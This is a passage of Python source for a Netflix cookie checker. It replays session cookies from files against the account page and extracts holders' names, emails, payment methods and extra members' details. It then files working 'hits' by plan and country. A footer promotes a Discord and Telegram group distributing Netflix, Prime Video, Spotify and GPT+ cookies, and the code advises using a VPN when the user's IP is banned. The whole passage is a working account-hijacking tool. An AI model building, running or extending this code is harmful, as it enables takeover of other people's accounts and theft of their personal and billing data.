        'Επιπλέον μέλος', 'Membru suplimentar', 'חבר נוסף', 'Додатковий учасник', 'Допълнителен член', 'Dodatni član', 'Ďalší člen',
        'Mwanachama wa ziada', 'Ekstra Lid', 'Anëtar shtesë', 'Ekstra Member','Tambahan Ahli', 'Kasapi ng dagdag',
        '추가 구성원', '追加メンバー', 'Članak Više','Ekstran jäsen', 'Extra Medlem', 'Üye Ekle', 'Ekstra Anggota', 'अतिरिक्त सदस्य',
        'Aggiuntivo', 'Miembro Suplementario', 'Extra Członek', 'Miembro adicional','Membre additionnel',
        'Miembro Extra Adicional', 'Membre en plus','Familienmitglied Extra', 'Extra Familjemedlem', 'Membro Extra Adicional',
        'Additional Buddy', 'Membre Extra', 'Miembro Extendido','Membro Extra Brasileiro', 'Omookùnrin Kan Sii', 'Ilungu Elengeziwe',
        'Ilungu Elongezelelweyo', 'Ekstra Lid Afrikaans', 'Manm Anplis Haitian','Karagdagang Miyembro',
        'ማሓበሪ ተጨማሪ', 'Onye Nzuko Tinye', 'Memba Na Kara','Padrão (assinante extra)',
        '额外会员', '额外用户', '其他成员', '추가 멤버', '추가 이용자','付费分享会员', 'Usuario Extra', 'Usuário Extra', 'Membro adicional',
        'Membro aggiuntivo','สมาชิกเพิ่มเติมพิเศษ','অতিরিক্ত সদস্য','அதிக உறுப்பினர்','နောက်ထပ်အဖွဲ့ဝင်','ekstra medlem',
    ]
}

plan_patterns = {
    plan_type: re.compile(
        r'\b(?:' + '|'.join(map(re.escape, keywords)) + r')\b',
        re.IGNORECASE
    )
    for plan_type, keywords in plan_keywords.items()
}

def translate_plan(plan_name):
    plan_type = 'Unknown'
    has_extra_member = False
    if plan_patterns['Extra Member'].search(plan_name):
        has_extra_member = True
        plan_name = plan_patterns['Extra Member'].sub('', plan_name)
    for type_key in ['Mobile', 'Basic', 'Standard with Ads', 'Standard', 'Premium']:
        if plan_patterns[type_key].search(plan_name):
            plan_type = type_key
            break
    return plan_type, has_extra_member

def extract_values_from_json(context, keys):
    result = {}
    for out_key, path_list in keys.items():
        value = context
        try:
            for step in path_list:
                if isinstance(value, dict):
                    value = value.get(step)
                elif isinstance(value, list) and isinstance(step, int) and 0 <= step < len(value):
                    value = value[step]
                else:
                    value = None
                    break
            if value is None:
                value = "Unknown"
            result[out_key] = value
        except:
            result[out_key] = "Unknown"
    return result

def safe_get(dct, keys, default=None):
    for key in keys:
        if isinstance(dct, dict):
            dct = dct.get(key)
        else:
            return default
    return dct if dct is not None else default

def get_plan_details(response_text):
    try:
        pattern = r'netflix\.reactContext\s*=\s*(\{.*?\});'
        match = re.search(pattern, response_text, re.DOTALL)
        if not match:
            return None

        json_str = html.unescape(match.group(1))
        json_str = re.sub(r'\\x([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), json_str)
        try:
            react_context = json.loads(json_str)
        except json.JSONDecodeError:
            return None

        if not isinstance(react_context, dict):
            return None

        user_info = safe_get(react_context, ["models", "userInfo", "data"], {})
        signup_info = safe_get(react_context, ["models", "signupContext", "data"], {})
        extra_info = safe_get(react_context, ["models", "truths", "data"], {})

        user_keys = {
            "name": ["name"],
            "email": ["emailAddress"],
            "country_of_signup": ["countryOfSignup"],
            "current_country": ["currentCountry"],
            "membership_status": ["membershipStatus"],
            "user_guid": ["userGuid"],
            "is_kids": ["isKids"],
            "is_in_free_trial": ["isInFreeTrial"],
            "user_locale": ["userLocale", "locale", "displayName"]
        }
        signup_keys = {
            "member_since_timestamp": ["flow", "fields", "memberSince", "value"],
            "can_change_plan": ["flow", "fields", "canChangePlan", "value"],
            "has_service": ["flow", "fields", "hasService", "value"],
            "localized_plan_name": ["flow", "fields", "currentPlan", "fields", "localizedPlanName", "value"],
            "max_streams": ["flow", "fields", "currentPlan", "fields", "maxStreams", "value"],
            "video_quality": ["flow", "fields", "currentPlan", "fields", "videoQuality", "value"],
            "plan_price": ["flow", "fields", "currentPlan", "fields", "planPrice", "value"],
            "has_ads": ["flow", "fields", "currentPlan", "fields", "hasAds", "value"],
            "formatted_lowest_plan_price": ["flow", "fields", "formattedLowestPlanPrice", "value"],
            "payer_email": ["flow", "fields", "payerEmail", "value"],
            "next_billing_date": ["flow", "fields", "nextBillingDate", "value"],
            "is_paused": ["flow", "fields", "isPaused", "value"],
            "is_pending_pause": ["flow", "fields", "isPendingPause", "value"],
            "show_extra_member_section": ["flow", "fields", "showExtraMemberSection", "value"],
        }

        extrainfo_keys = {
            "anonymous": ["ANONYMOUS"],
            "current_member": ["CURRENT_MEMBER"],
            "former_member": ["FORMER_MEMBER"],
            "never_member": ["NEVER_MEMBER"],
            "is_gift_card_member_mode": ["isGiftCardMemberMode"],
            "mock_payment_request_enabled": ["mockPaymentRequestEnabled"],
            "mock_itunesPayment_enabled": ["mockItunesPaymentEnabled"],
        }

        user_details = extract_values_from_json(user_info, user_keys)
        signup_details = extract_values_from_json(signup_info, signup_keys)
        extra_details = extract_values_from_json(extra_info, extrainfo_keys)

        can_change_plan = signup_details.get('can_change_plan', True)
        if isinstance(can_change_plan, str):
            can_change_plan = (can_change_plan.lower() == 'true')
        elif not isinstance(can_change_plan, bool):
            can_change_plan = True

        payer_email = signup_details.get('payer_email', 'Unknown')
        is_extra_member_account = (not can_change_plan) and (payer_email != 'Unknown')

        payment_methods = signup_info.get("flow", {}).get("fields", {}).get("paymentMethods", {}).get('value', [])
        if payment_methods:
            payment_info = payment_methods[0].get('value', {})
            extracted_payment_info = {}
            for k, field in payment_info.items():
                val = field.get('value', 'Unknown')
                extracted_payment_info[k] = val

            third_party_billing_partner = extracted_payment_info.get('thirdPartyBillingPartner', False)

            if 'type' in extracted_payment_info:
                pm_type = extracted_payment_info.get('type', 'Unknown')
                display_text = extracted_payment_info.get('displayText', 'Unknown')
                payment_method_str = f"{pm_type} ({display_text})"
            elif 'partnerDisplayName' in extracted_payment_info:
                partner_display_name = extracted_payment_info.get('partnerDisplayName', 'Unknown')
                pm = extracted_payment_info.get('paymentMethod', 'Unknown')
                payment_method_str = f"{partner_display_name} ({pm})"
            else:
                payment_method_str = ' / '.join(
                    f"{k2}: {v2}" for k2, v2 in extracted_payment_info.items()
                )
        else:
            payment_method_str = "Unknown"
            third_party_billing_partner = False

        signup_details.update({
            "payment_method": payment_method_str,
            "third_party_billing_partner": third_party_billing_partner
        })

        show_extra_member_section = signup_details.get("show_extra_member_section", False)
        if isinstance(show_extra_member_section, str):
            show_extra_member_section = (show_extra_member_section.lower() == 'true')

        if is_extra_member_account:
            signup_details.update({
                "slots_full": 0,
                "empty_slots": "None",
                "has_extra_member_slots": False,
                "extra_member_details": [],
                "total_slots": 0,
                "occupied_slots": 0,
                "show_extra_member_section": False
            })
        else:
            if show_extra_member_section:
                add_on_slots = safe_get(signup_info, ['flow', 'fields', 'addOnSlots', 'value'], [])
                extra_member_details, full_slots, empty_slots = [], 0, []
                for idx, slot in enumerate(add_on_slots):
                    slot_fields = slot.get('fields', {}) if isinstance(slot, dict) else {}
                    slot_state = safe_get(slot_fields, ['slotState', 'value'], 'Unknown')
                    slot_email = safe_get(slot_fields, ['beneficiaryEmail', 'value'], 'No Email')
                    slot_name = safe_get(slot_fields, ['profileName', 'value'], 'No Name')
                    if slot_state == 'SLOT_OCCUPIED':
                        full_slots += 1
                        extra_member_details.append({
                            'slot_number': idx + 1,
                            'slot_state': slot_state,
                            'email': slot_email,
                            'name': slot_name
                        })
                    else:
                        empty_slots.append(f"Slot {idx + 1}")
                total_slots = len(add_on_slots)
                occupied_slots = full_slots
                signup_details.update({
                    "slots_full": full_slots,
                    "empty_slots": empty_slots or "None",
                    "has_extra_member_slots": True,
                    "extra_member_details": extra_member_details,
                    "total_slots": total_slots,
                    "occupied_slots": occupied_slots,
                    "show_extra_member_section": True
                })
            else:
                plan_t, _ = translate_plan(signup_details.get('localized_plan_name', 'Unknown'))
                if plan_t == 'Premium':
                    signup_details["has_extra_member_slots"] = True
                else:
                    signup_details["has_extra_member_slots"] = False

                signup_details.update({
                    "slots_full": 0,
                    "empty_slots": "None",
                    "extra_member_details": [],
                    "total_slots": 0,
                    "occupied_slots": 0,
                    "show_extra_member_section": show_extra_member_section
                })

        try:
            timestamp = int(signup_details.get("member_since_timestamp", 0)) / 1000
            signup_details["membership_since"] = datetime.datetime.fromtimestamp(
                timestamp, datetime.timezone.utc
            ).strftime('%Y-%m-%d %H:%M:%S')
        except:
            signup_details["membership_since"] = "Unknown"

        try:
            plan_price_encoded = signup_details.get("plan_price", signup_details.get("formatted_lowest_plan_price", "Unknown"))
            plan_price_decoded = bytes(plan_price_encoded.encode('utf-8')).decode('unicode_escape')
            plan_price_decoded = html.unescape(plan_price_decoded)
            signup_details["plan_price"] = plan_price_decoded
        except:
            signup_details["plan_price"] = plan_price_encoded

        plan_details = {**user_details, **signup_details}
        plan_details.update({
            'is_extra_member_account': is_extra_member_account,
            'payer_email': payer_email,
            'has_extra_member_slots': signup_details.get('has_extra_member_slots', False),
            'show_extra_member_section': show_extra_member_section
        })

        gift_credit_info = safe_get(signup_info, ['flow', 'fields', 'giftCredit'], {})
        plan_details['has_netflix_credits'] = bool(gift_credit_info)

        nbd = plan_details.get("next_billing_date", "Unknown")
        plan_details["membership_ended"] = False
        if nbd != "Unknown":
            try:
                dt_nbd = dateutil.parser.parse(nbd)
                now = datetime.datetime.now(dt_nbd.tzinfo) if dt_nbd.tzinfo else datetime.datetime.now()
                if dt_nbd < now:
                    plan_details["membership_ended"] = True
            except:
                pass

        return plan_details
    except:
        return None

def generate_header_text(plan_details):
    header_lines = []
    user_info = []
    name = plan_details.get('name', 'Unknown')
    email = plan_details.get('email', 'Unknown')
    country = plan_details.get('country_of_signup', 'Unknown')
    if name != 'Unknown':
        user_info.append(f"Name: {name}")
    if email != 'Unknown':
        user_info.append(f"Email: {email}")
    if country != 'Unknown':
        user_info.append(f"Country of Signup: {country}")
    if user_info:
        header_lines.append("# " + ' | '.join(user_info))

    plan_info = []
    plan = plan_details.get('localized_plan_name', 'Unknown')
    video_quality = plan_details.get('video_quality', 'Unknown')
    membership_since = plan_details.get('membership_since', 'Unknown')
    max_streams = plan_details.get('max_streams', 'Unknown')
    is_extra_member_account = plan_details.get('is_extra_member_account', False)

    if plan != 'Unknown':
        plan_info.append(f"Plan: {plan}")
    if video_quality != 'Unknown':
        plan_info.append(f"Video Quality: {video_quality}")
    if max_streams != 'Unknown':
        plan_info.append(f"Max Streams: {max_streams}")
    if membership_since != 'Unknown':
        plan_info.append(f"Member Since: {membership_since}")
    if is_extra_member_account:
        plan_info.append("Is Extra Member Account")

    conditions = {
        "Account is paused": plan_details.get('is_paused', False),
        "Pending pause": plan_details.get('is_pending_pause', False),
        "No service": not plan_details.get('has_service', True),
        "In free trial": plan_details.get('is_in_free_trial', False),
        "Kids account": plan_details.get('is_kids', False),
        f"Membership Status: {plan_details.get('membership_status', 'Unknown')}":
            plan_details.get('membership_status', 'UNKNOWN').lower() not in ['current_member']
    }
    cond_parts = [key for key, value in conditions.items() if value]
    plan_info.extend(cond_parts)

    if plan_details.get('membership_ended', False):
        plan_info.append("Membership Ended (Billing Date in Past)")

    if plan_info:
        header_lines.append("# " + ' | '.join(plan_info))

    if plan_details.get('show_extra_member_section', False):
        header_lines.append(
            f"# Extra Slots Used: {plan_details.get('occupied_slots', 0)}/{plan_details.get('total_slots', 0)}"
        )
        for member in plan_details.get('extra_member_details', []):
            slot_info = f"Slot {member.get('slot_number')}: "
            slot_state = member.get('slot_state', 'Unknown')
            if slot_state == 'SLOT_OCCUPIED':
                slot_info += f"Occupied by {member.get('name', 'No Name')} ({member.get('email', 'No Email')})"
            elif slot_state == 'SLOT_OPEN':
                slot_info += "Empty slot"
            else:
                slot_info += f"Slot State: {slot_state}"
            header_lines.append(f"# {slot_info}")

    payment_info = []
    payment_method = plan_details.get('payment_method', 'Unknown')
    plan_price = plan_details.get('plan_price', 'Unknown')
    next_billing_date = plan_details.get('next_billing_date', 'Unknown')
    payer_email = plan_details.get('payer_email', 'Unknown')

    if payment_method != 'Unknown':
        payment_info.append(f"Payment Method: {payment_method}")
    if plan_price != 'Unknown':
        payment_info.append(f"Plan Price: {plan_price}")
    if next_billing_date != 'Unknown':
        payment_info.append(f"Next Billing Date: {next_billing_date}")
    if payer_email != 'Unknown':
        payment_info.append(f"Payer Email: {payer_email}")

    if payment_info:
        header_lines.append("# " + ' | '.join(payment_info))

    header_lines.append("# ------------------")
    return header_lines

def generate_footer_text():
    return [
        "#============",
        "# Discord server link  : https://discord.gg/fmpofficial or https://discord.gg/DfUm7qWxRu",
        "# Telegram link : https://t.me/flamemodparadiseofficial",
        "# Checker by Phoenix : Flame Mod Paradise (FMP) (Phoenix)",
        "# Join for Netflix, Prime Video, Spotify, and GPT+ cookies",
        "# Don't share the cookie with anyone for longer period working",
        "#================"
    ]

def process_cookie_content(content, plan_details, add_header_footer):
    lines = content.splitlines()
    index = 0
    while index < len(lines):
        line = lines[index]
        if line.strip() == '' or line.strip().startswith('#'):
            index += 1
        else:
            break
    main_content_start = index

    index = len(lines) - 1
    while index >= 0:
        line = lines[index]
        if line.strip() == '' or line.strip().startswith('#'):
            index -= 1
        else:
            break
    main_content_end = index + 1

    main_content = lines[main_content_start:main_content_end]

    if add_header_footer:
        header_lines = generate_header_text(plan_details)
        footer_lines = generate_footer_text()
        new_lines = header_lines + ['', ''] + main_content + ['', ''] + footer_lines
    else:
        new_lines = main_content

    new_content = '\n'.join(new_lines)
    return new_content

def handle_error(error_type, cookie_name, cookie_path, counts, counts_lock, exception=None):
    global continuous_network_errors

    error_folder = os.path.join("bad", error_type)
    os.makedirs(error_folder, exist_ok=True)

    if error_type == ErrorType.NETWORK:
        shutil.copy(cookie_path, os.path.join(error_folder, cookie_name))
    else:
        shutil.move(cookie_path, os.path.join(error_folder, cookie_name))

    with counts_lock:
        counts['errors'] += 1

    with print_lock:
        print(colorama.Fore.MAGENTA + f"[{error_type}] for {cookie_name}")
        if exception:
            print(f"[{error_type}] for {cookie_name}: {exception}")

    with network_errors_lock:
        if error_type == ErrorType.NETWORK:
            continuous_network_errors += 1
            if continuous_network_errors >= 30:
                print(colorama.Fore.RED + "Your IP is banned, please connect to VPN. (Continuous Net Errors)")
        else:
            continuous_network_errors = 0

def handle_cookie_placement(plan_details, cookie_name, cookie_path,
                            unique_userguids_map, counts, counts_lock, unique_userguids_lock,
                            raw_cookie_content):

    def sanitize_filename_part(s):
        s = re.sub(r'[\/:*?"<>|]', '_', s)
        s = s.strip()
        return s[:50]

    def map_video_quality(quality):
        if quality is None:
            return 'Unknown'
        quality = quality.lower()
        delimiters = ['\\(', '/', ',']
        pattern = '|'.join(delimiters)
        split_quality = re.split(pattern, quality)[0].strip()
        if 'ultra hd' in split_quality or 'uhd' in split_quality or '4k' in split_quality:
            return 'UHD'
        elif 'hd' in split_quality and not ('ultra hd' in split_quality or 'uhd' in split_quality):
            return 'HD'
        elif 'sd' in split_quality or 'standard' in split_quality or '720p' in split_quality:
            return 'Standard'
        else:
            return 'Unknown'

    base_folder = "hits"
    cookie_identifier = plan_details.get('user_guid', 'Unknown')
    email = plan_details.get('email', 'Unknown')

    if cookie_identifier == 'Unknown':
        cookie_identifier = os.path.splitext(cookie_name)[0]

    email_sanitized = 'UnknownEmail' if email == 'Unknown' else sanitize_filename_part(email)
    country = plan_details.get('country_of_signup', 'Unknown')
    plan_local = plan_details.get('localized_plan_name', 'Unknown')
    membership_status = plan_details.get('membership_status', 'Unknown')
    video_quality = plan_details.get('video_quality', 'Unknown')

    plan_type, is_extra_member_plan = translate_plan(plan_local)
    mapped_quality = map_video_quality(video_quality)

    has_extra_member_slots = plan_details.get('has_extra_member_slots', False)
    occupied_slots = plan_details.get('occupied_slots', 0)
    total_slots = plan_details.get('total_slots', 0)
    payer_email = plan_details.get('payer_email', 'Unknown')
    third_party_billing_partner = plan_details.get('third_party_billing_partner', False)
    payment_method = plan_details.get('payment_method', 'Unknown')

    is_paused = plan_details.get('is_paused', False)
    is_pending_pause = plan_details.get('is_pending_pause', False)
    has_service = plan_details.get('has_service', True)
    is_in_free_trial = plan_details.get('is_in_free_trial', False)
    is_kids = plan_details.get('is_kids', False)
    is_extra_member_account = plan_details.get('is_extra_member_account', False)

    ms_lower = membership_status.lower()
    all_unknown_fields = (
        ms_lower == 'unknown'
        and plan_type == 'Unknown'
        and mapped_quality == 'Unknown'
        and plan_details.get('user_guid', 'Unknown') == 'Unknown'
        and email == 'Unknown'
    )
    if all_unknown_fields:
        unknown_folder = os.path.join(base_folder, 'unknown')
        os.makedirs(unknown_folder, exist_ok=True)
        index = 1
        while True:
            new_cookie_name = f"{index}_UnknownCookie.txt"
            destination_path = os.path.join(unknown_folder, new_cookie_name)
            if not os.path.exists(destination_path):
                break
            index += 1

        new_content = process_cookie_content(raw_cookie_content, plan_details, ADD_HEADER_FOOTER)
        with open(destination_path, 'w', encoding='utf-8') as f:
            f.write(new_content)

        os.remove(cookie_path)
        with counts_lock:
            counts['valid'] += 1
        with print_lock:
            print(colorama.Fore.YELLOW + f"✔️ Login success but all fields unknown => {cookie_name}")
            print(colorama.Fore.LIGHTYELLOW_EX + f"Moved to {destination_path}")
        return destination_path, new_cookie_name

    country_sanitized = sanitize_filename_part(country) if country != 'Unknown' else None
    plan_sanitized = sanitize_filename_part(plan_type) if plan_type != 'Unknown' else None
    payment_method_sanitized = sanitize_filename_part(payment_method) if payment_method != 'Unknown' else None
    mapped_quality_sanitized = mapped_quality if mapped_quality != 'Unknown' else None

    filename_parts = []
    if country_sanitized:
        filename_parts.append(country_sanitized)
    if plan_sanitized:
        filename_parts.append(plan_sanitized)
    if email_sanitized != 'UnknownEmail':
        filename_parts.append(email_sanitized)
    if payment_method_sanitized:
        filename_parts.append(payment_method_sanitized)
    if mapped_quality_sanitized and mapped_quality_sanitized != 'Unknown':
        filename_parts.append(mapped_quality_sanitized)

    if not filename_parts:
        filename_parts.append('PartialUnknownCookie')

    new_cookie_name = '[' + ']['.join(filename_parts) + '].txt'

    if ms_lower in ['never_member', 'former_member']:
        folder_name = ms_lower
        folder_path = os.path.join("bad", folder_name)
        os.makedirs(folder_path, exist_ok=True)

        new_content = process_cookie_content(raw_cookie_content, plan_details, ADD_HEADER_FOOTER)
        destination_path = os.path.join(folder_path, new_cookie_name)

        with open(destination_path, 'w', encoding='utf-8') as f:
            f.write(new_content)
        os.remove(cookie_path)

        with counts_lock:
            if ms_lower == 'former_member':
                counts['former_member'] += 1
            else:
                counts['never_member'] += 1

        with print_lock:
            print(f"{colorama.Fore.MAGENTA}✔️ Login success {cookie_name}, but membership status: {membership_status}")
            print(f"{colorama.Fore.MAGENTA}Moved to folder '{folder_path}' (not counted as valid)")

        duplicate_identifier = f"{cookie_identifier}-{email}"
        with unique_userguids_lock:
            occurrence = unique_userguids_map.get(duplicate_identifier, 0)
            unique_userguids_map[duplicate_identifier] = occurrence + 1

        return destination_path, new_cookie_name

    if not has_service:
        folder_path = os.path.join("bad", "noservice")
        os.makedirs(folder_path, exist_ok=True)

        new_content = process_cookie_content(raw_cookie_content, plan_details, ADD_HEADER_FOOTER)
        destination_path = os.path.join(folder_path, new_cookie_name)

        with open(destination_path, 'w', encoding='utf-8') as f:
            f.write(new_content)
        os.remove(cookie_path)

        with counts_lock:
            counts['no_service'] += 1

        with print_lock:
            print(f"{colorama.Fore.CYAN}Account has NO service => {cookie_name} => Moved to '{folder_path}' (Not counted as valid)")

        duplicate_identifier = f"{cookie_identifier}-{email}"
        with unique_userguids_lock:
            occurrence = unique_userguids_map.get(duplicate_identifier, 0)
            unique_userguids_map[duplicate_identifier] = occurrence + 1

        return destination_path, new_cookie_name

    quality_folder = mapped_quality_sanitized.lower() if mapped_quality_sanitized else "unknown"

    if third_party_billing_partner:
        if has_extra_member_slots and total_slots > 0:
            folder_path = os.path.join(base_folder, quality_folder, "extramember", "bought", "thirdpartybillingpartner")
        else:
            folder_path = os.path.join(base_folder, "thirdpartybillingpartner", quality_folder)
    else:
        if is_extra_member_account:
            folder_path = os.path.join(base_folder, "extra_member_accounts")
        else:
            quality_path = os.path.join(base_folder, quality_folder)
            if has_extra_member_slots:
                if total_slots > 0:
                    folder_path = os.path.join(quality_path, "extra_slots", "bought")
                else:
                    folder_path = os.path.join(quality_path, "extra_slots", "unbought")
            else:
                folder_path = quality_path

            if is_paused:
                folder_path = os.path.join(base_folder, "ispaused")
            elif is_pending_pause:
                folder_path = os.path.join(base_folder, "pendingpaused")
            elif not has_service:
                folder_path = os.path.join(base_folder, "noservice")
            elif is_in_free_trial:
                folder_path = os.path.join(base_folder, "freetrial")
            elif is_kids:
                folder_path = os.path.join(base_folder, "kids")

    os.makedirs(folder_path, exist_ok=True)

    duplicate_identifier = f"{cookie_identifier}-{email}"
    with unique_userguids_lock:
        occurrence = unique_userguids_map.get(duplicate_identifier, 0)
        unique_userguids_map[duplicate_identifier] = occurrence + 1

    new_content = process_cookie_content(raw_cookie_content, plan_details, ADD_HEADER_FOOTER)
    destination_path = os.path.join(folder_path, new_cookie_name)
    with open(destination_path, 'w', encoding='utf-8') as f:
        f.write(new_content)
    os.remove(cookie_path)

    if occurrence == 0:
        with counts_lock:
            counts['valid'] += 1
            counts['plan_hits'].setdefault(plan_type, 0)
            counts['plan_hits'][plan_type] += 1
            counts['video_quality_hits'].setdefault(mapped_quality, 0)
            counts['video_quality_hits'][mapped_quality] += 1

            if third_party_billing_partner:
                counts['third_party_billing_partner'] += 1
            if is_paused:
                counts['is_paused'] += 1
            if is_pending_pause:
                counts['is_pending_pause'] += 1
            if is_in_free_trial:
                counts['in_free_trial'] += 1
            if is_kids:
                counts['is_kids'] += 1
            if ms_lower != 'current_member':
                counts['non_current_member'] += 1
            if is_extra_member_account:
                counts['extra_member'] += 1
            elif has_extra_member_slots:
                counts['extra_slot'] += 1
                if total_slots > 0:
                    counts['extra_slot_bought'] += 1
                else:
                    counts['extra_slot_unbought'] += 1

            if 'plan_country' not in counts:
                counts['plan_country'] = {}
            if plan_type not in counts['plan_country']:
                counts['plan_country'][plan_type] = {}
            if country not in counts['plan_country'][plan_type]:
                counts['plan_country'][plan_type][country] = {
                    'count': 0,
                    'extra_bought_count': 0,
                    'extra_unbought_count': 0,
                    'third_party_count': 0,
                    'normal_count': 0
                }
            counts['plan_country'][plan_type][country]['count'] += 1
            if third_party_billing_partner:
                counts['plan_country'][plan_type][country]['third_party_count'] += 1
            if has_extra_member_slots:
                if total_slots > 0:
                    counts['plan_country'][plan_type][country]['extra_bought_count'] += 1
                else:
                    counts['plan_country'][plan_type][country]['extra_unbought_count'] += 1
            if not third_party_billing_partner and not has_extra_member_slots:
                counts['plan_country'][plan_type][country]['normal_count'] += 1

        with print_lock:
            print(f"{colorama.Fore.GREEN}✔️ Login successful with {cookie_name}")
            print(f"{colorama.Fore.CYAN}Country:{colorama.Fore.YELLOW} {country}{colorama.Fore.RESET}")
            print(f"{colorama.Fore.CYAN}Plan:{colorama.Fore.YELLOW} {plan_type}{colorama.Fore.RESET}")
            print(f"{colorama.Fore.CYAN}Video Quality:{colorama.Fore.YELLOW} {video_quality}{colorama.Fore.RESET}")
            print(f"{colorama.Fore.CYAN}Payment Method:{colorama.Fore.YELLOW} {payment_method}{colorama.Fore.RESET}")
            if third_party_billing_partner:
                print(f"{colorama.Fore.CYAN}Third Party Billing Partner: {colorama.Fore.YELLOW}Yes{colorama.Fore.RESET}")

            if not is_extra_member_account:
                if has_extra_member_slots and total_slots > 0:
                    print(f"{colorama.Fore.CYAN}Extra Slots Used:{colorama.Fore.YELLOW} {occupied_slots}/{total_slots}")
            else:
                print(f"{colorama.Fore.CYAN}Is Extra Member Account:{colorama.Fore.YELLOW} Yes")
                print(f"{colorama.Fore.CYAN}Payer Email:{colorama.Fore.YELLOW} {payer_email}")

            print(f"{colorama.Fore.CYAN}Account Email:{colorama.Fore.YELLOW} {email}{colorama.Fore.RESET}")
            if plan_details.get('membership_ended', False):
                print(colorama.Fore.MAGENTA + f"Membership ended (Billing date is in the past).")
            print("-" * 50)
            if is_paused:
                print(colorama.Fore.CYAN + "Account is currently paused")
            if is_pending_pause:
                print(colorama.Fore.CYAN + "Account is pending pause")
            if is_in_free_trial:
                print(colorama.Fore.CYAN + "Account is in free trial")
            if is_kids:
                print(colorama.Fore.CYAN + "Account is a Kids account")
            if ms_lower != 'current_member':
                print(f"{colorama.Fore.CYAN}Membership Status:{colorama.Fore.YELLOW} {membership_status}")
            if plan_details.get('has_netflix_credits', False):
                print(f"{colorama.Fore.CYAN}Netflix Credits Available:{colorama.Fore.YELLOW} Yes")

            if has_extra_member_slots and plan_details.get('extra_member_details', []):
                for member in plan_details['extra_member_details']:
                    slot_num = member.get('slot_number')
                    slot_state = member.get('slot_state', 'Unknown')
                    slot_email = member.get('email', 'No Email')
                    slot_name = member.get('name', 'No Name')
                    if slot_state == 'SLOT_OCCUPIED':
                        slot_info = f"Occupied by {slot_name} ({slot_email})"
                    elif slot_state == 'SLOT_OPEN':
                        slot_info = "Empty slot"
                    else:
                        slot_info = f"Slot State: {slot_state}"
                    print(f"{colorama.Fore.CYAN}Slot {slot_num}:{colorama.Fore.YELLOW} {slot_info}")
            print("-" * 50)
        return destination_path, new_cookie_name
    else:
        with counts_lock:
            counts['duplicates'] += 1
        base_name, ext = os.path.splitext(new_cookie_name)
        new_cookie_name = f"{base_name}[{occurrence}]{ext}"

        duplicates_folder = os.path.join("bad", "duplicates")
        os.makedirs(duplicates_folder, exist_ok=True)

        with open(destination_path, 'r', encoding='utf-8') as f:
            already_new_content = f.read()

        dup_path = os.path.join(duplicates_folder, new_cookie_name)
        with open(dup_path, 'w', encoding='utf-8') as f:
            f.write(already_new_content)

        with print_lock:
            print(f"{colorama.Fore.BLUE}✔️ [Duplicate] {cookie_name} -> {new_cookie_name}{colorama.Fore.RESET}")

        return dup_path, new_cookie_name

def parse_netscape_cookie_file(cookie_path):
    with open(cookie_path, 'r', encoding='utf-8', errors='replace') as f:
        raw_content = f.read()
    raw_content = raw_content.replace('#HttpOnly_', '')

    lines = raw_content.splitlines()
    cookies_jar = requests.cookies.RequestsCookieJar()
    for line in lines:
        if not line.strip() or line.startswith('#'):
            continue
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            domain = parts[0]
            path = parts[2]
            secure = parts[3].upper() == 'TRUE'
            name, value = parts[5], parts[6]
            try:
                cookies_jar.set(name, value, domain=domain, path=path, secure=secure)
            except:
                continue
    return cookies_jar, raw_content

def parse_json_cookie_file(cookie_path):
    with open(cookie_path, 'r', encoding='utf-8', errors='replace') as f:
        raw_content = f.read().strip()
    try:
        data = json.loads(raw_content)
    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON in {cookie_path}: {e}")

    if not isinstance(data, list):
        raise ValueError(f"JSON data is not a list of cookies in {cookie_path}")

    jar = requests.cookies.RequestsCookieJar()
    for item in data:
        if not isinstance(item, dict):
            continue
        domain = item.get('domain', '.netflix.com')
        path = item.get('path', '/')
        secure = item.get('secure', False)
        name = item.get('name', '')
        value = item.get('value', '')
        jar.set(name, value, domain=domain, path=path, secure=secure)

    return jar, raw_content

def partial_flush_network():
    global session

    with print_lock:
        print(colorama.Fore.CYAN + "[INFO] Partial flush: re-initializing session.")

    pause_event.set()
    time.sleep(0.5)

    if session is not None:
        try:
            session.close()
        except:
            pass

    session = create_session(
        use_random_ua=True,
        max_retries=5,
        backoff_factor=2.0
    )

    randomize_headers(session)

    time.sleep(2.0)

    pause_event.clear()

    with print_lock:
        print(colorama.Fore.CYAN + "[INFO] Partial flush complete. Resuming checks...")

def do_main_cookie_check(parse_func, is_json, num_threads):
    counts = {
        'total_checked': 0,
        'plan_hits': {},
        'video_quality_hits': {},
        'bad': 0,
        'errors': 0,
        'extra_member': 0,
        'duplicates': 0,
        'valid': 0,
        'extra_slot': 0,
        'extra_slot_bought': 0,
        'extra_slot_unbought': 0,
        'is_paused': 0,
        'is_pending_pause': 0,
        'no_service': 0,
        'in_free_trial': 0,
        'is_kids': 0,
        'non_current_member': 0,
        'third_party_billing_partner': 0,
        'free_accounts': 0,
        'former_member': 0,
        'never_member': 0,
        'plan_country': {}
    }
    start_time = datetime.datetime.now()
    unique_userguids_map = {}
    counts_lock = threading.RLock()
    unique_userguids_lock = threading.RLock()

    cqueue = Queue()
    cookie_files = []

    for root, dirs, files in os.walk("cookies"):
        for file in files:
            if parse_func == parse_netscape_cookie_file:
                if file.lower().endswith(".txt"):
                    cookie_files.append(os.path.join(root, file))
            else:
                if file.lower().endswith(".json") or file.lower().endswith(".txt"):
                    cookie_files.append(os.path.join(root, file))

    total_cookies = len(cookie_files)
    if total_cookies == 0:
        if parse_func == parse_netscape_cookie_file:
            print(colorama.Fore.RED + "No .txt cookies found in 'cookies' folder.")
        else:
            print(colorama.Fore.RED + "No JSON-like cookies found in 'cookies' folder.")
        input(colorama.Fore.CYAN + "Press enter to return\n")
        clear_screen()
        return

    for cfile in cookie_files:
        cqueue.put((cfile, 1))

    def worker():
        global continuous_network_errors
        while True:
            while pause_event.is_set():
                time.sleep(0.1)
            try:
                item = cqueue.get(timeout=5)
            except queue.Empty:
                break

            cookie_path, attempt = item
            cookie_name = os.path.basename(cookie_path)

            try:
                with counts_lock:
                    counts['total_checked'] += 1

                jar, raw_content = parse_func(cookie_path)
                session_local = create_session()
                session_local.cookies.update(jar)

                success = False
                for attempt_num in range(1, 4):
                    try:
                        internet_connected.wait()
                        while pause_event.is_set():
                            time.sleep(0.1)

                        resp = session_local.get("https://www.netflix.com/YourAccount", timeout=15, verify=False)
                        lower_text = resp.text.lower()
                        lower_url = resp.url.lower()

                        if ("login" in lower_url) or ("sign in" in lower_text):
                            with counts_lock:
                                counts['bad'] += 1
